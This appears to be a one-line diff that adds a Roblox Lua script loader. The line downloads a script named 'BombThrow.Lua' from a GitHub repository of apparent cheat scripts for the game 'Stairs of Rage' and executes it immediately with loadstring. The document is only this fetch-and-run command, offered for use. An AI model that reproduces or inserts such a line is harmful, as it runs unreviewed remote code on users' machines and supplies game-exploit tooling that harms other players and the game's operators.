@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nexuscripts/Stairs-of-Rage-Scripts/refs/heads/main/BombThrow.Lua"))()
